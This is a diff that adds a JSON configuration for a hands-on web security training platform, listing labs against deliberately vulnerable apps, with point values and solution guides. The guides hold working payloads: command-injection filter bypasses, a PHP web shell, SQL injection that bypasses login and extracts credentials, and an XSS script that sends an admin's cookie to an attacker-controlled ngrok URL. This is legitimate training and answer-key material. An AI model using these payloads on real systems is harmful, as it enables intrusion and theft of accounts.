@@ -1,0 +1,461 @@
+[
+    {
+        "title":"Lab 01: Installing Kali linux",
+        "description":"Not implemented yet",
+        "location": null,
+        "disabled":true,
+        "steps":[{"description":"Deploy the machine","id":1,"point":1}],
+        "guide":null,
+        "imageNames":null,
+        "isPlayground":false
+    },
+    {
+        "title":"Lab 02: Installing DVWA",
+        "description":"Not implemented yet",
+        "location": null,
+        "disabled":true,
+        "steps":[{"description":"Deploy the machine","id":1,"point":1}],
+        "guide":null,
+        "isPlayground":false,
+        "imageNames":null
+    },
+    {
+        "title":"Lab 03: Command execution basic testing",
+        "description":"This lab is vulnerable to Command Injection with 4 different levels. For each level, you need to create a file `flagX.txt` under /tmp with X equals to that level(For example: flag1.txt at level 1)",
+        "location":"VulnWeb/cmdi",
+        "steps":[
+            {
+                "description":"Deploy the machine",
+                "id":1,"point": 1
+            },
+            {
+                "description":"Level 1: create file flag1.txt at /tmp",
+                "id":1,"point": 3
+            },
+            {
+                "description":"Level 2: create file flag2.txt at /tmp",
+                "id":1,"point": 3
+            },
+            {
+                "description":"Level 3: create file flag3.txt at /tmp",
+                "id":1,"point": 2
+            },
+            {
+                "description":"Level 4: create file flag4.txt at /tmp",
+                "id":1,"point": 1
+            }
+        ],
+        "disabled":false,
+        "guide":"1. Nothing is filter, solution: `touch /tmp/flag1.txt` (in username)  \n2.['&&',';','\\','/'] are filtered, solution: `touch $(echo . | tr '!-0' '\"-1')tmp$(echo . | tr '!-0' '\"-1')flag2.txt`  \n3.['&&','&',';','|','-','$','(',')','`','||','/','\\'] are filtered, solution: `touch ${HOME:0:1}tmp${HOME:0:1}flag3.txt`  \n4.??:D?!!<> ",
+        "isPlayground":false,
+        "imageNames":"app_cmdi"
+
+    },
+    {
+        "title":"Lab 04: Tamper data from web using temper",
+        "description":"This lab is designed for you to be familiar with the proxy tool. You can use anything you have to wrap the HTTP request (Burp Suite, ZAP, Developer tool, ... or writing yourself a script). You are give a credential User1:password to access a blog website. Try to complete the lab!",
+        "location":"VulnWeb/tamper",
+        "steps":[
+            {
+                "description":"Deploy the machine",
+                "id":1,"point": 1
+            },
+            {
+                "description":"Add the new header with key is 'X-kbk-xyz' and access /homepage",
+                "id":1,"point": 3
+            },
+            {
+                "description":"Can you see how the post is indexed, find the secret one!",
+                "id":1,"point": 3
+            },
+            {
+                "description":"Look like developer forgot to delete something",
+                "id":1,"point": 2
+            },
+            {
+                "description":"A secret method",
+                "id":1,"point": 1
+            }
+        ],
+        "disabled":false,
+        "guide":"1. Send the *GET* request at `/homepage` to burp repeater (or any similar tool) and add *`X-kbk-xyz`* as a new header with any value (Ex: X-kbk-xyz: easy_step-1).  \n2. Did you see that each post is indexed by the path `/posts/:postid`? Use Burp Intruder to find out other secret post. You will find it in `/posts/10`.  \n3. You should find that developer has forgot to delete that comment in html response at `/posts/10`, find and access that secret path at `/kbk/youfoundmysecretpath`.  \n4. Sometime there are many methods on the same endpoint (REST), use Burp Intruder and try to change the method *`GET`* to *`DELETE`* at `/posts/10`",
+        "isPlayground":false,
+        "imageNames":"app_tamper"
+    },
+    {
+        "title":"Lab 05: XPATH injection",
+        "description":"This lab is vulnerable to XPATH injection. You need to login as admin to complete the lab",
+        "location":"VulnWeb/xpath",
+        "steps":[
+            {
+                "description":"Deploy the machine",
+                "id":1,"point": 1
+            },
+            {
+                "description":"Only one mission: Login :)",
+                "id":1,"point": 9
+            }
+        ],
+        "disabled":false,
+        "guide":"In password: `' or '1'='1`",
+        "isPlayground":false,
+        "imageNames":"app_xpath"
+    },
+    {
+        "title":"Lab 06: Formula Injection",
+        "description":"Not implemented yet",
+        "location": null,
+        "disabled":true,
+        "steps":[{"description":"Deploy the machine","id":1,"point":1}],
+        "guide":null,
+        "isPlayground":false,
+        "imageNames":""
+    },
+    {
+        "title":"Lab 07: PHP Object Injection",
+        "description":"Not implemented yet",
+        "location": null,
+        "disabled":true,
+        "steps":[{"description":"Deploy the machine","id":1,"point":1}],
+        "guide":null,
+        "isPlayground":false,
+        "imageNames":""
+    },
+    {
+        "title":"Lab 08 Unrestricted File Upload",
+        "description":"This lab has 3 different levels for file upload, to complete the lab you need to upload successfully a webshell and use it to create file flagX.txt in tmp and click on button 'Check Point'.",
+        "location":"VulnWeb/fileupload",
+        "steps":[
+            {
+                "description":"Deploy the machine",
+                "id":1,"point": 1
+            },
+            {
+                "description":"Create /tmp/flag1.txt in level 1",
+                "id":1,"point": 5
+            },
+            {
+                "description":"Create /tmp/flag2.txt in level 2",
+                "id":1,"point": 3
+            },
+            {
+                "description":"Create /tmp/flag3.txt in level 3",
+                "id":1,"point": 1
+            }
+        ],
+        "disabled":false,
+        "guide":"1. Create a file with `php extension` (example: `shell.php`) with the following content:  \n       `<?php echo \"Shell:\";system($_GET['cmd']); ?>`  \n   The file is now uploading to `/uploads/shell.php`  \n   Go to there and try to execute some command  \n   - Current localtion: example.com/uploads/shell.php?cmd=pwd  \nList all file:example.com/uploads/shell.php?cmd=ls+-al  \n   To complete task 1: example.com/uploads/shell.php?cmd=touch+/tmp/flag1.txt  \n   Back to upload site and click 'Check point'  \n2. The server checks the Content-Type -> in the uploading request changes 'Content-Type' header to 'image/jpeg'  \n3. The server checks the MIME number of the file: add '89 50 4E 47 0D 0A 1A 0A' to the prefix of the content of file (hexa)",
+        "isPlayground":false,
+        "imageNames":"app_fileupload"
+    },
+    {
+        "title":"Lab 09: Normal SQL injection",
+        "description":"This lab is vulnerable to SQLi with easy level, try to complete it :D",
+        "location":"VulnWeb/sqli",
+        "steps":[
+            {
+                "description":"Deploy the machine",
+                "id":1,"point": 1
+            },
+            {
+                "description":"Bypass authentication with SQLi payload in username",
+                "id":1,"point": 3
+            },
+            {
+                "description":"Bypass authentication with SQLi payload in username",
+                "id":1,"point": 3
+            },
+            {
+                "description":"Extract the real credetial and login with it",
+                "id":1,"point": 3
+            }
+        ],
+        "disabled":false,
+        "guide":"1. In username: `admin' OR 1=1#` (let the password empty)  \n2. In password: `aaaaa' OR '1'='1`  \n3. - Determine number of columns by `UNION query`, in search: `1080' UNION SELECT null#`, the server returns sql error. Increase the number of 'null' you will see that with query `1080' UNION SELECT null,null,null#` the server won't raise error anymore (which mean the vulnerable query returns 3 columns in response table)  \n - Determine the name of database: `1080' UNION SELECT schema_name,null,null FROM information_schema.schemata#`  \n - Determine the name of table: `' UNION SELECT null,table_schema,table_name FROM information_schema.tables WHERE table_schema = 'test_mysql'#`  \n - Determine the name of column: `a' UNION SELECT column_name,table_name,null FROM information_schema.columns WHERE table_schema = 'test_mysql'#`  \n - Now we have enough informations about the database, time to extract its data: `aa' UNION SELECT user_name,user_password,null FROM users#`  \n Login with that credential to complete the last step",
+        "isPlayground":false,
+        "imageNames":"app_sqli,db_sqli"
+    },
+    {
+        "title":"Lab 11: Automated SQL Injection with SQLMap",
+        "description":"Not implemented yet",
+        "location": null,
+        "disabled":true,
+        "steps":[{"description":"Deploy the machine","id":1,"point":1}],
+        "guide":null,
+        "isPlayground":false,
+        "imageNames":""
+    },
+    {
+        "title":"Lab 12: Blind SQL injection",
+        "description":"Not implemented yet",
+        "location": null,
+        "disabled":true,
+        "steps":[{"description":"Deploy the machine","id":1,"point":1}],
+        "guide":null,
+        "isPlayground":false,
+        "imageNames":""
+    },
+    {
+        "title":"Lab 13: Upload PHP Backdoor Payload",
+        "description":"Not implemented yet",
+        "location": null,
+        "disabled":true,
+        "steps":[{"description":"Deploy the machine","id":1,"point":1}],
+        "guide":null,
+        "isPlayground":false,
+        "imageNames":""
+    },
+    {
+        "title":"Lab 14: Reflected XSS",
+        "description":"This lab is vulnerable to XSS. There is an admin that stands behind the web and checks every URL you report. To complete the lab you need to grab his cookie and use it to access /homepage",
+        "location":"VulnWeb/rxss",
+        "steps":[
+            {
+                "description":"Deploy the machine",
+                "id":1,"point": 1
+            },
+            {
+                "description":"Only one mission: obtain the admin cookie and access /homepage with it",
+                "id":1,"point": 9
+            }
+        ],
+        "disabled":false,
+        "guide":"this is guide `code in here`",
+        "isPlayground":false,
+        "imageNames":"app_rxss"
+    },
+    {
+        "title":"Lab 15: Stored XSS",
+        "description":"This lab is vulnerable to XSS. There is an admin that stands behind the web and checks the content of /homepage every 2 minutes. To complete the lab you need to grab his cookie and use it to access /posts/search. Use the following credential: `User1:password`",
+        "location": "VulnWeb/stored-xss",
+        "disabled":false,
+        "steps":[
+            {
+                "description":"Deploy the machine",
+                "id":1,"point": 1
+            },
+            {
+                "description":"Only one mission: obtain the admin cookie and access /posts/search with it",
+                "id":1,"point": 9
+            }
+        ],
+        "guide":"Requirements:  \n - Burpsuite and a browser has configured [proxy](https://portswigger.net/burp/documentation/desktop/external-browser-config/browser-config-firefox) and [certificate](https://portswigger.net/burp/documentation/desktop/external-browser-config/certificate/ca-cert-firefox)  \n - [Python3][https://www.python.org/downloads/] and [ngrok][https://ngrok.com/], make sure you have authenticated ngrok binary (If you has Burpsuite Pro, use Burp Collaborator instead)  \n After you have all of the above you can continue:  \n - Take a look on comment function and try to input `'\"><script>alert(1)</script>`, you will see an alert is opened, like this   \n ![1](/guides/15/1.jpg)   \n - As mentioned in the description, other users are using the web, try to grab there cookie  \n - Open terminal and run this: `python3 -m http.server 8000`. This will run a simple HTTP server on your localhost:8000 at current folder, you can access it via your browser. But you will need a public IP to receive the data (our server doesn't know your localhost). The terminal will look like this  \n ![2](/guides/15/2.jpg)   \n - Open another terminal, go to the location of ngrok binary and run: `ngrok http 8000`. This will open a tunnel from ngrok to your python HTTP server. The output looks like this:  \n ![3](/guides/15/3.jpg)   \n - You will receive a public url like the this  https://*.ngrok.io, when you visit it, it will forward the traffic to your local python HTTP server. Nice!! Now we have a public server on the internet. COPY THAT URL.  \n - In commnent, input the following: `'\"><script>document.location=\"YOUR_URL_HERE?c=\"+document.cookie</script>`, remember to replace YOUR_URL_HERE with above url and wait for 2 minutes or more \n ![4](/guides/15/4.jpg)   \n - the secret cookie returns like above take it and add as a new cookie, send it to /posts/search, use burp repeater as below  \n ![5](/guides/15/5.jpg)",
+        "isPlayground":false,
+        "imageNames":"app_stored_xss"
+    },
+    {
+        "title":"Lab 16: DOM-Based XSS",
+        "description":"Not implemented yet",
+        "location": null,
+        "disabled":true,
+        "steps":[{"description":"Deploy the machine","id":1,"point":1}],
+        "guide":null,
+        "isPlayground":false,
+        "imageNames":""
+    },
+    {
+        "title":"Lab 17: CSRF with curl",
+        "description":"Not implemented yet",
+        "location": null,
+        "disabled":true,
+        "steps":[{"description":"Deploy the machine","id":1,"point":1}],
+        "guide":null,
+        "isPlayground":false,
+        "imageNames":""
+    },
+    {
+        "title":"Lab 18: CSRF with browser",
+        "description":"This lab is vulnerable to CSRF in change password function, try to change password of User2 and login",
+        "location": "VulnWeb/csrf",
+        "disabled":false,
+        "steps":[{"description":"Deploy the machine","id":1,"point":1},{"description":"Login as User2","id":1,"point":9}],
+        "guide":null,
+        "isPlayground":false,
+        "imageNames":"app_csrf"
+    },
+    {
+        "title":"Lab 19: File upload",
+        "description":"Not implemented yet",
+        "location": null,
+        "disabled":true,
+        "steps":[{"description":"Deploy the machine","id":1,"point":1}],
+        "guide":null,
+        "isPlayground":false,
+        "imageNames":""
+    },
+    {
+        "title":"Lab 20: SSRF",
+        "description":"Not implemented yet",
+        "location": "VulnWeb/ssrf",
+        "disabled":false,
+        "steps":[
+            {
+                "description":"Deploy the machine",
+                "id":1,"point": 1
+            },
+            {
+                "description":"Access the secret thing :D",
+                "id":1,"point": 9
+            }
+        ],
+        "guide":"The proxy will take a url and return its content.  \nTry to enumerate local port by enter `localhost:<port>` to find which one is opened (Use python or burp intruder)  \n. Access to its robots.txt :D and find the secret content to finish the lab",
+        "isPlayground":false,
+        "imageNames":"app_ssrf"
+    },
+    {
+        "title":"Lab 21: IDOR",
+        "description":"Not implemented yet",
+        "location": null,
+        "disabled":true,
+        "steps":[{"description":"Deploy the machine","id":1,"point":1}],
+        "guide":null,
+        "isPlayground":false,
+        "imageNames":""
+    },
+    {
+        "title":"Lab 22: Burpsuite and Spider function",
+        "description":"Not implemented yet",
+        "location": null,
+        "disabled":true,
+        "steps":[{"description":"Deploy the machine","id":1,"point":1}],
+        "guide":null,
+        "isPlayground":false,
+        "imageNames":""
+    },
+    {
+        "title":"Lab 23: Nikto",
+        "description":"Not implemented yet",
+        "location": null,
+        "disabled":true,
+        "steps":[{"description":"Deploy the machine","id":1,"point":1}],
+        "guide":null,
+        "isPlayground":false,
+        "imageNames":""
+    },
+    {
+        "title":"Lab 24: C99.php backdoor",
+        "description":"Not implemented yet",
+        "location": null,
+        "disabled":true,
+        "steps":[{"description":"Deploy the machine","id":1,"point":1}],
+        "guide":null,
+        "isPlayground":false,
+        "imageNames":""
+    },
+    {
+        "title":"Lab 25 & 26: SQL Injection",
+        "description":"Not implemented yet",
+        "location": null,
+        "disabled":true,
+        "steps":[{"description":"Deploy the machine","id":1,"point":1}],
+        "guide":null,
+        "isPlayground":false,
+        "imageNames":""
+    },
+    {
+        "title":"Lab 27: Weak Session Cookie analysis with Burp Suite",
+        "description":"Not implemented yet",
+        "location": null,
+        "disabled":true,
+        "steps":[{"description":"Deploy the machine","id":1,"point":1}],
+        "guide":null,
+        "isPlayground":false,
+        "imageNames":""
+    },
+    {
+        "title":"Lab 28: File path traversal with Burp Suite",
+        "description":"Not implemented yet",
+        "location": null,
+        "disabled":true,
+        "steps":[{"description":"Deploy the machine","id":1,"point":1}],
+        "guide":null,
+        "isPlayground":false,
+        "imageNames":""
+    },
+    {
+        "title":"Lab 29: Unvalidated Redirects and Forwards",
+        "description":"Not implemented yet",
+        "location": null,
+        "disabled":true,
+        "steps":[{"description":"Deploy the machine","id":1,"point":1}],
+        "guide":null,
+        "isPlayground":false,
+        "imageNames":""
+    },
+    {
+        "title":"Lab 30: Server-side Template Injection - easy - classic",
+        "description":"This lab is inspired by SSTI, try it :D",
+        "location":"VulnWeb/rxss",
+        "steps":[
+            {
+                "description":"Deploy the machine",
+                "id":1,"point": 1
+            },
+            {
+                "description":"Find the place and trigger the error :D",
+                "id":1,"point": 4
+            },
+            {
+                "description":"Create file flag.txt at /tmp",
+                "id":1,"point": 5
+            }
+        ],
+        "disabled":false,
+        "guide":"this is guide `code in here`",
+        "isPlayground":false,
+        "imageNames":"app_ssti,db_ssti"
+    },
+    {
+        "title":"Lab 30: Server-side Template Injection - easy - classic",
+        "description":"This lab is inspired by SSTI, try it :D",
+        "location":"VulnWeb/rxss",
+        "steps":[
+            {
+                "description":"Deploy the machine",
+                "id":1,"point": 1
+            },
+            {
+                "description":"Find the place and trigger the error :D",
+                "id":1,"point": 4
+            },
+            {
+                "description":"Create file flag.txt at /tmp",
+                "id":1,"point": 5
+            }
+        ],
+        "disabled":false,
+        "guide":"this is guide `code in here`",
+        "isPlayground":false,
+        "imageNames":"app_ssti,db_ssti"
+    },
+    {
+        "title":"DVWA: Old but gold",
+        "description":"This is DVWA",
+        "location":"VulnWeb/dvwa",
+        "steps":[
+            {
+                "description":"Play it",
+                "id":1,"point": 10
+            }
+        ],
+        "disabled":false,
+        "guide":"this is guide `code in here`",
+        "isPlayground":true,
+        "imageNames":"app_dvwa"
+    },
+    {
+        "title":"Juice-shop: Ultimate OWASP Project",
+        "description":"This is Juice-shop",
+        "location":"VulnWeb/juice-shop",
+        "steps":[
+            {
+                "description":"Play it",
+                "id":1,"point": 10
+            }
+        ],
+        "disabled":false,
+        "guide":"this is guide `code in here`",
+        "isPlayground":true,
+        "imageNames":"app_juice_shop"
+    }
+]
